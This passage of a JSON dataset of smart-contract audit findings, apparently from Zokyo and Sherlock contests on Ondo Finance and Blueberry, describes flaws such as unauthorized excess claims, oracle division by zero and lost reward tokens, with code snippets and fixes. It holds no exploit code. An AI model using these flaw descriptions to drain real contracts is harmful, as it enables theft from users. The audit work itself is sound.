      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "44756",
      "title": "Anyone can claim excess",
      "impact": "HIGH",
      "content": "**Severity**: High\n\n**Status**: Resolved\n\n**Description**\n\nIn the RWAHubNonStableInstantMints contract, there is no check for the msg.sender to be authorized to claim the excess of the deposit. The only check there is to be KYC'd. Therefore, anyone who went through the KYC could get a claim excess\n\n**Recommendation**: \n\nadd a check for the msg.sender to be authorized by the depositor.user to claim the excess or at least mint to the depositor user, not to msg.sender",
      "summary": "\nThis bug report is about a contract called RWAHubNonStableInstantMints. The problem is that there is no check to make sure the person claiming excess deposits is authorized to do so. This means that anyone who has gone through the KYC process can claim excess deposits, even if they are not the original depositor. The recommendation is to add a check to make sure the person claiming excess deposits is authorized by the depositor, or at least only allow the depositor to claim the excess. This issue has been resolved.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "18512",
      "title": "M-3: Updating the feeManger on config will cause desync between bank and vaults",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/32 \n\n## Found by \n0x52\n## Summary\n\nWhen the bank is initialized it caches the current config.feeManager. This is problematic since feeManger can be updated in config. Since it is precached the address in bank will not be updated leading to a desync between contracts the always pull the freshest value for feeManger and bank.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L142\n\n        feeManager = config_.feeManager();\n\nAbove we see that feeManger is cached during initialization.\n\n https://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/vault/HardVault.sol#L140-L143\n\n        withdrawAmount = config.feeManager().doCutVaultWithdrawFee(\n            address(uToken),\n            shareAmount\n        );\n\nThis is in direct conflict with other contracts the always use the freshest value. This is problematic for a few reasons. The desync will lead to inconsistent fees across the ecosystem either charging users too many fees or not enough.\n\n## Impact\n\nAfter update users will experience inconsistent fees across the ecosystem\n\n## Code Snippet\n\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L142\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nBlueBerryBank should always use config.feeManger instead of caching it.",
      "summary": "\nThis bug report is about the issue M-3, which is related to the desync between the bank and the vaults due to the updating of the feeManager on the config. It was found by 0x52 and the impact of this issue is that users will experience inconsistent fees across the ecosystem after the update. The code snippet for this issue is from the BlueBerryBank.sol file at line 142. This issue was found using manual review and the recommendation is that BlueBerryBank should always use the config.feeManger instead of caching it.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/32",
      "tags": [
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18511",
      "title": "M-2: ShortLongSpell#openPosition attempts to burn wrong token",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/30 \n\n## Found by \n0x52\n## Summary\n\nShortLongSpell#openPosition attempts to burn vault.uToken when it should be using vault instead. The result is that ShortLongSpell#openPosition will be completely nonfunctional when the user is adding to their position\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L133-L140\n\n            address burnToken = address(ISoftVault(strategy.vault).uToken());\n            if (collSize > 0) {\n                if (posCollToken != address(wrapper))\n                    revert Errors.INCORRECT_COLTOKEN(posCollToken);\n                bank.takeCollateral(collSize);\n                wrapper.burn(burnToken, collSize);\n                _doRefund(burnToken);\n            }\n\nWe see above that the contract attempts to withdraw vault.uToken from the wrapper.\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L145-L150\n\n        _doPutCollateral(\n            vault,\n            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(\n                address(this)\n            )\n        );\n\nThis is in direct conflict with the collateral that is actually deposited which is vault. This will cause the function to always revert when adding to an existing position.\n\n## Impact\n\nShortLongSpell#openPosition will be completely nonfunctional when the user is adding to their position\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L111-L151\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nBurn token should be vault rather than vault.uToken",
      "summary": "\nThis bug report is about a problem with the ShortLongSpell#openPosition function in the 2023-05-blueberry-judging repository. The issue is that the function attempts to burn vault.uToken when it should be using vault instead, resulting in the function being completely nonfunctional when the user is adding to their position. The code snippet that is causing the issue can be found at https://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L111-L151. The bug was found by 0x52 using manual review. The recommendation to fix the issue is to burn token should be vault rather than vault.uToken.",
      "quality_score": 2,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/30",
      "tags": [
        "Coding-Bug"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18510",
      "title": "M-1: BalancerPairOracle#getPrice will revert due to division by zero in some cases",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/25 \n\n## Found by \n0x52, nobody2018\n## Summary\n\n`BalancerPairOracle#getPrice` internally calls `computeFairReserves`, which returns fair reserve amounts given spot reserves, weights, and fair prices. When the parameter `resA` passed to `computeFairReserves` is smaller than `resB`, division by 0 will occur.\n\n## Vulnerability Detail\n\nIn `BalancerPairOracle#getPrice`, resA and resB passed to `computeFairReserves` are the balance of TokenA and TokenB of the pool respectively. It is common for the balance of TokenB to be greater than the balance of TokenA.\n\n```solidity\nfunction computeFairReserves(\n        uint256 resA,\n        uint256 resB,\n        uint256 wA,\n        uint256 wB,\n        uint256 pxA,\n        uint256 pxB\n    ) internal pure returns (uint256 fairResA, uint256 fairResB) {\n    \t...\n    \t//@audit r0 = 0 when resA < resB.\n->      uint256 r0 = resA / resB;\n        uint256 r1 = (wA * pxB) / (wB * pxA);\n        // fairResA = resA * (r1 / r0) ^ wB\n        // fairResB = resB * (r0 / r1) ^ wA\n        if (r0 > r1) {\n            uint256 ratio = r1 / r0;\n            fairResA = resA * (ratio ** wB);\n            fairResB = resB / (ratio ** wA);\n        } else {\n->          uint256 ratio = r0 / r1;\t\t// radio = 0 when r0 = 0\n->          fairResA = resA / (ratio ** wB);   \t// revert divided by 0\n            fairResB = resB * (ratio ** wA);\n        }\n    }\n```\n\nAnother case is **when the decimals of tokenA is smaller than the decimals of tokenB**, such as usdc(e6)-weth(e18).\n\n## Impact\n\nAll functions that subcall `BalancerPairOracle#getPrice` will be affected.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/oracle/BalancerPairOracle.sol#L35-L66\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n```diff\n--- a/blueberry-core/contracts/oracle/BalancerPairOracle.sol\n+++ b/blueberry-core/contracts/oracle/BalancerPairOracle.sol\n@@ -50,7 +50,7 @@ contract BalancerPairOracle is UsingBaseOracle, IBaseOracle {\n         // --> fairResA / r1^wB = constant product\n         // --> fairResA = resA^wA * resB^wB * r1^wB\n         // --> fairResA = resA * (resB/resA)^wB * r1^wB = resA * (r1/r0)^wB\n-        uint256 r0 = resA / resB;\n+        uint256 r0 = resA * 10**(decimalsB) / resB;\n         uint256 r1 = (wA * pxB) / (wB * pxA);\n         // fairResA = resA * (r1 / r0) ^ wB\n         // fairResB = resB * (r0 / r1) ^ wA\n```\n\n\n\n## Discussion\n\n**securitygrid**\n\nEscalate for 10 USDC\nThis is a valid M/H. Please review **Vulnerability Detail** of this report, it describes 2 cases:\n1. resA and resB passed to computeFairReserves are the balance of TokenA and TokenB of the pool respectively. It is common for the balance of TokenB to be greater than the balance of TokenA.\n2. when the decimals of tokenA is smaller than the decimals of tokenB, such as usdc(e6)-weth(e18).\n\n**This issue is same root as #28**.\nThe impact described in #28 is only possible if the dp of the two tokens are different. But it is not completely correct, because when the dp of token0 is less than the dp of token1, a division by zero error occurs, such as token0(e6)-token1(e18).\nMerging the two reports is the best description.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> This is a valid M/H. Please review **Vulnerability Detail** of this report, it describes 2 cases:\n> 1. resA and resB passed to computeFairReserves are the balance of TokenA and TokenB of the pool respectively. It is common for the balance of TokenB to be greater than the balance of TokenA.\n> 2. when the decimals of tokenA is smaller than the decimals of tokenB, such as usdc(e6)-weth(e18).\n> \n> **This issue is same root as #28**.\n> The impact described in #28 is only possible if the dp of the two tokens are different. But it is not completely correct, because when the dp of token0 is less than the dp of token1, a division by zero error occurs, such as token0(e6)-token1(e18).\n> Merging the two reports is the best description.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IAm0x52**\n\nAgreed with escalation. This and #28 are dupes and this does a better job of describing the issue so it should be the main issue. Additionally given that the contract would become nonfunctional rather than return an incorrect price, I agree with the watson's original severity of medium.\n\n**hrishibhat**\n\nEscalation accepted\n\nValid medium\nMaking this issue the main one and #28 a duplicate of this issue. \n\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Valid medium\n> Making this issue the main one and #28 a duplicate of this issue. \n> \n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue in BalancerPairOracle#getPrice which can cause a transaction to revert due to division by zero in some cases. It was found by 0x52 and nobody2018. \n\nThe issue is caused by the `computeFairReserves` function, which is called by `BalancerPairOracle#getPrice`. When the parameter `resA` passed to `computeFairReserves` is smaller than `resB`, division by 0 will occur. This is common for the balance of TokenB to be greater than the balance of TokenA. Another case is when the decimals of tokenA is smaller than the decimals of tokenB, such as usdc(e6)-weth(e18). \n\nAll functions that subcall `BalancerPairOracle#getPrice` will be affected. The code snippet can be found at https://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/oracle/BalancerPairOracle.sol#L35-L66. The tool used to find this bug was Manual Review. \n\nThe recommendation is to modify the code as follows:\n\n```diff\n--- a/blueberry-core/contracts/oracle/BalancerPairOracle.sol\n+++ b/blueberry-core/contracts/oracle/BalancerPairOracle.sol\n@@ -50,7 +50,7 @@ contract BalancerPairOracle is UsingBaseOracle, IBaseOracle {\n         // --> fairResA / r1^wB = constant product\n         // --> fairResA = resA^wA * resB^wB * r1^wB\n         // --> fairResA = resA * (resB/resA)^wB * r1^wB = resA * (r1/r0)^wB\n-        uint256 r0 = resA / resB;\n+        uint256 r0 = resA * 10**(decimalsB) / resB;\n         uint256 r1 = (wA * pxB) / (wB * pxA);\n         // fairResA = resA * (r1 / r0) ^",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/25",
      "tags": [
        "Wrong Math",
        "Missing-Logic",
        "Decimals"
      ],
      "finders": [
        "0x52",
        "nobody2018"
      ]
    },
    {
      "id": "18509",
      "title": "H-2: ShortLongSpell#openPosition uses the wrong balanceOf when determining how much collateral to put",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/31 \n\n## Found by \n0x52\n## Summary\n\nThe _doPutCollateral subcall in ShortLongSpell#openPosition uses the balance of the uToken rather than the vault resulting in the vault tokens being left in the contract which will be stolen.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L144-L150\n\n        address vault = strategies[param.strategyId].vault;\n        _doPutCollateral(\n            vault,\n            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(\n                address(this)\n            )\n        );\n\nWhen putting the collateral the contract is putting vault but it uses the balance of the uToken instead of the balance of the vault.\n\n## Impact\n\nVault tokens will be left in contract and stolen\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L111-L151\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse the balanceOf vault rather than vault.uToken\n\n\n\n## Discussion\n\n**sleepriverfish**\n\nEscalate for 10 USDC\n\nIn #Blueberry Update, despite the successful escalation of the issue, no reward was granted for the heightened severity and impact of the vulnerability. However, in #Blueberry Update2, a reward was offered specifically for the detection and reporting of a similar vulnerability.\nhttps://github.com/sherlock-audit/2023-04-blueberry-judging/issues/116\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> In #Blueberry Update, despite the successful escalation of the issue, no reward was granted for the heightened severity and impact of the vulnerability. However, in #Blueberry Update2, a reward was offered specifically for the detection and reporting of a similar vulnerability.\n> https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/116\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IAm0x52**\n\nThis issue has been escalated in the first contest and should be valid in both\n\n**hrishibhat**\n\nEscalation accepted\n\nThis is a valid issue, and necessary decisions have been taken in the respective issue from the previous contest. \n\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> This is a valid issue, and necessary decisions have been taken in the respective issue from the previous contest. \n> \n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the ShortLongSpell#openPosition subcall in the Smart Contract of the Blueberry project. The issue is that the contract uses the balance of the uToken rather than the balance of the vault when determining how much collateral to put. This results in the vault tokens being left in the contract, which can be stolen. The code snippet that is causing the issue is located at https://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L144-L150. The bug was found by 0x52 and manual review was used as a tool. The impact is that vault tokens will be left in contract and stolen. The recommendation is to use the balanceOf vault rather than vault.uToken. The bug was escalated for 10 USDC and the escalation was accepted. This issue was already escalated in the first contest and the necessary decisions have been taken in the respective issue from the previous contest. The contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/31",
      "tags": [
        "External Contract",
        "Fund Lock",
        "Coding-Bug"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18508",
      "title": "H-1: AuraSpell#openPositionFarm fails to return all rewards to user",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/29 \n\n## Found by \n0x52, nobody2018\n## Summary\n\nWhen a user adds to an existing position on AuraSpell, the contract burns their current position and remints them a new one. The issues is that WAuraPool will send all reward tokens to the contract but it only sends Aura back to the user, causing all other rewards to be lost.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L256-L261\n\n        for (uint i = 0; i < rewardTokens.length; i++) {\n            IERC20Upgradeable(rewardTokens[i]).safeTransfer(\n                msg.sender,\n                rewards[i]\n            );\n        }\n\nInside WAuraPools#burn reward tokens are sent to the user.\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L130-L140\n\n        IBank.Position memory pos = bank.getCurrentPositionInfo();\n        if (pos.collateralSize > 0) {\n            (uint256 pid, ) = wAuraPools.decodeId(pos.collId);\n            if (param.farmingPoolId != pid)\n                revert Errors.INCORRECT_PID(param.farmingPoolId);\n            if (pos.collToken != address(wAuraPools))\n                revert Errors.INCORRECT_COLTOKEN(pos.collToken);\n            bank.takeCollateral(pos.collateralSize);\n            wAuraPools.burn(pos.collId, pos.collateralSize);\n            _doRefundRewards(AURA);\n        }\n\nWe see above that the contract only refunds Aura to the user causing all other extra reward tokens received by the contract to be lost to the user.\n\n## Impact\n\nUser will lose all extra reward tokens from their original position\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWAuraPool returns the reward tokens it sends. Use this list to refund all tokens to the user\n\n\n\n## Discussion\n\n**sleepriverfish**\n\nEscalate for 10 USDC.\nThe issue was  excluded from #Blueberry Update, it appears to have been rewarded in #Blueberry Update 2.\nhttps://github.com/sherlock-audit/2023-04-blueberry-judging/issues/42\n\n**sherlock-admin**\n\n > Escalate for 10 USDC.\n> The issue was  excluded from #Blueberry Update, it appears to have been rewarded in #Blueberry Update 2.\n> https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/42\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**securitygrid**\n\nEscalate for 10 USDC\nvalid H. Nobody escalated [it](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/42) \n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> valid H. Nobody escalated [it](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/42) \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IAm0x52**\n\nAgreed with second escalation\n\n**sleepriverfish**\n\nSo, the issue https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/42 considered invalid? I believe it should be categorized and rewarded in some way.\n\n**hrishibhat**\n\nEscalation rejected\n\nValid high\nThe issue mentioned above has been resolved accordingly in the respective contest. \n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> Valid high\n> The issue mentioned above has been resolved accordingly in the respective contest. \n\n    This issue's escalations have been rejected!\n\n    Watsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nA bug report has been raised in the Sherlock Audit repository about an issue with the AuraSpell#openPositionFarm contract. It was found by 0x52 and nobody2018 and is related to the WAuraPool contract. The issue is that when a user adds to an existing position on AuraSpell, the contract burns their current position and remints them a new one. However, the WAuraPool contract only sends the Aura token back to the user, causing all other rewards to be lost. \n\nThe vulnerability detail is that inside the WAuraPools#burn function, reward tokens are sent to the user. However, in the AuraSpell#openPositionFarm function, the contract only refunds Aura to the user, causing all other extra reward tokens received by the contract to be lost to the user. \n\nThe impact of this bug is that users will lose all extra reward tokens from their original position.\n\nThe tool used to identify this bug was manual review. The recommendation is that WAuraPool should be modified to return the reward tokens it sends. This list should then be used to refund all tokens to the user.\n\nThe issue was discussed and it was decided that the issue mentioned previously had been resolved accordingly in the respective contest, so the escalation was rejected. Watsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/29",
      "tags": [
        "Check Return Value",
        "Missing-Logic",
        "Fund Lock",
        "Deposit/Reward tokens"
      ],
      "finders": [
        "0x52",
        "nobody2018"
      ]
    },
    {
      "id": "18507",
      "title": "M-13: Missing checks for whether Arbitrum Sequencer is active",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/142 \n\n## Found by \n0xepley, Bauchibred, Bauer, Brenzee, J4de, ctf\\_sec, deadrxsezzz, tallo, tsvetanovv\n## Summary\n\nMissing checks for whether Arbitrum Sequencer is active\n\n## Vulnerability Detail\n\nthe onchain deployment context is changed, in prev contest the protocol only attemps to deploy the code to ethereum while in the current contest\n\nthe protocol intends to deploy to arbtrium as well!\n\nChainlink recommends that users using price oracles, check whether the Arbitrum sequencer is active\n\nhttps://docs.chain.link/data-feeds#l2-sequencer-uptime-feeds\n\nIf the sequencer goes down, the index oracles may have stale prices, since L2-submitted transactions (i.e. by the aggregating oracles) will not be processed.\n\n## Impact\n\nStale prices, e.g. if USDC were to de-peg while the sequencer is offline, stale price is used and can result in false liquidation or over-borrowing.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/oracle/ChainlinkAdapterOracle.sol#L76-L98\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse sequencer oracle to determine whether the sequencer is offline or not, and don't allow orders to be executed while the sequencer is offline.",
      "summary": "\nThis bug report is about the missing checks for whether the Arbitrum Sequencer is active. It was found by 0xepley, Bauchibred, Bauer, Brenzee, J4de, ctf\\_sec, deadrxsezzz, tallo, and tsvetanovv. The protocol intends to deploy to Arbtrium, and Chainlink recommends that users using price oracles check whether the Arbitrum sequencer is active. If the sequencer goes down, the index oracles may have stale prices which can result in false liquidation or over-borrowing. The code snippet for this issue can be found at the given link. The tool used was Manual Review. The recommendation is to use sequencer oracle to determine whether the sequencer is offline or not, and not to allow orders to be executed while the sequencer is offline.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/142",
      "tags": [
        "Stale Price",
        "Oracle",
        "Missing-Logic",
        "L2 Sequencer",
        "Arbitrum"
      ],
      "finders": [
        "Bauer",
        "J4de",
        "tallo",
        "tsvetanovv",
        "deadrxsezzz",
        "Brenzee",
        "Bauchibred",
        "0xepley",
        "ctf\\_sec"
      ]
    },
    {
      "id": "18506",
      "title": "M-12: rewardTokens removed from WAuraPool/WConvexPools will be lost forever",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/128 \n\n## Found by \n0x52\n## Summary\n\npendingRewards pulls a fresh count of reward tokens each time it is called. This is problematic if reward tokens are ever removed from the the underlying Aura/Convex pools because it means that they will no longer be distributed and will be locked in the contract forever.\n\n## Vulnerability Detail\n\n[WAuraPools.sol#L166-L189](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L166-L189)\n\n        uint extraRewardsCount = IAuraRewarder(crvRewarder)\n            .extraRewardsLength();\n        tokens = new address[](extraRewardsCount + 1);\n        rewards = new uint256[](extraRewardsCount + 1);\n\n        tokens[0] = IAuraRewarder(crvRewarder).rewardToken();\n        rewards[0] = _getPendingReward(\n            stCrvPerShare,\n            crvRewarder,\n            amount,\n            lpDecimals\n        );\n\n        for (uint i = 0; i < extraRewardsCount; i++) {\n            address rewarder = IAuraRewarder(crvRewarder).extraRewards(i);\n            uint256 stRewardPerShare = accExtPerShare[tokenId][i];\n            tokens[i + 1] = IAuraRewarder(rewarder).rewardToken();\n            rewards[i + 1] = _getPendingReward(\n                stRewardPerShare,\n                rewarder,\n                amount,\n                lpDecimals\n            );\n        }\n\nIn the lines above we can see that only tokens that are currently available on the pool. This means that if tokens are removed then they are no longer claimable and will be lost to those entitled to shares.\n\n## Impact\n\nUsers will lose reward tokens if they are removed\n\n## Code Snippet\n\n[WAuraPools.sol#L152-L190](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L152-L190)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nReward tokens should be stored with the tokenID so that it can still be paid out even if it the extra rewardToken is removed.",
      "summary": "\nThis bug report is about an issue with reward tokens being removed from the WAuraPool/WConvexPools contract in the Sherlock Audit 2023-04-blueberry-judging project. The bug was found by 0x52 and it was identified through manual review. \n\nThe code snippet shows that only tokens that are currently available in the pool are taken into consideration when the pendingRewards function is called. This means that if tokens are removed from the pool, they will not be distributed to the users and will be locked in the contract forever. As a result, users will lose reward tokens if they are removed.\n\nThe recommendation is to store the reward tokens with the tokenID so that it can still be paid out even if the extra rewardToken is removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/128",
      "tags": [
        "Lending Pool",
        "Deposit/Reward tokens",
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18505",
      "title": "M-11: AuraSpell#closePositionFarm requires users to swap all reward tokens through same router",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/122 \n\n## Found by \n0x52\n## Summary\n\nAuraSpell#closePositionFarm requires users to swap all reward tokens through same router. This is problematic as it is very unlikely that a UniswapV2 router will have good liquidity sources for all tokens and will result in users experiencing forced losses to their reward token.  \n\n## Vulnerability Detail\n\n[AuraSpell.sol#L193-L203\n](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L193-L203)\n\n        for (uint256 i = 0; i < rewardTokens.length; i++) {\n            uint256 rewards = _doCutRewardsFee(rewardTokens[i]);\n            _ensureApprove(rewardTokens[i], address(swapRouter), rewards);\n            swapRouter.swapExactTokensForTokens(\n                rewards,\n                0,\n                swapPath[i],\n                address(this),\n                type(uint256).max\n            );\n        }\n\nAll tokens are forcibly swapped through a single router.\n\n## Impact\n\nUsers will be forced to swap through a router even if it doesn't have good liquidity for all tokens\n\n## Code Snippet\n\n[AuraSpell.sol#L149-L224](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L149-L224)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow users to use an aggregator like paraswap or multiple routers instead of only one single UniswapV2 router.",
      "summary": "\nA bug was found in the AuraSpell#closePositionFarm function of the Sherlock-Audit/2023-04-blueberry-judging repository by 0x52. This bug requires users to swap all reward tokens through the same UniswapV2 router, resulting in users experiencing forced losses to their reward token due to lack of liquidity. The code snippet responsible for this issue is located in AuraSpell.sol#L193-L203. The impact of this bug is that users are forced to swap through a router even if it doesn't have good liquidity for all tokens. The bug was found through manual review. The recommendation is to allow users to use an aggregator like paraswap or multiple routers instead of only one single UniswapV2 router.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/122",
      "tags": [
        "Uniswap",
        "Swap",
        "Configuration"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18504",
      "title": "M-10: Issue 94 from previous contest has not been fixed",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/118 \n\n## Found by \n0x52, Bauchibred, cducrest-brainbot, deadrxsezzz, helpMePlease, kaysoft, peanuts, tsvetanovv\n## Summary\n\n[Issue 94](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94) still exists exactly even though it was marked as \"will fix\".\n\n## Vulnerability Detail\n\nSee [Issue 94](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94)\n\n## Impact\n\nSee [Issue 94](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94)\n\n## Code Snippet\n\n[ChainlinkAdapterOracle.sol#L77-L97](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/oracle/ChainlinkAdapterOracle.sol#L77-L97)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nSee [Issue 94](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94)",
      "summary": "\nThis bug report is about Issue M-10, which is related to Issue 94 from a previous contest. It was found by eight members of the Sherlock Audit team, and it has not been fixed even though it was marked as \"will fix\". The vulnerability details, impact, code snippet, and recommendation can be found in Issue 94. It was found using manual review. This issue needs to be addressed as soon as possible.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/118",
      "tags": [
        "Stale Price",
        "Oracle",
        "Missing-Logic"
      ],
      "finders": [
        "kaysoft",
        "0x52",
        "cducrest-brainbot",
        "tsvetanovv",
        "deadrxsezzz",
        "peanuts",
        "Bauchibred",
        "helpMePlease"
      ]
    },
    {
      "id": "18503",
      "title": "M-9: Issue 290 from previous contest has not been fully addressed by fixes",
      "impact": "MEDIUM",
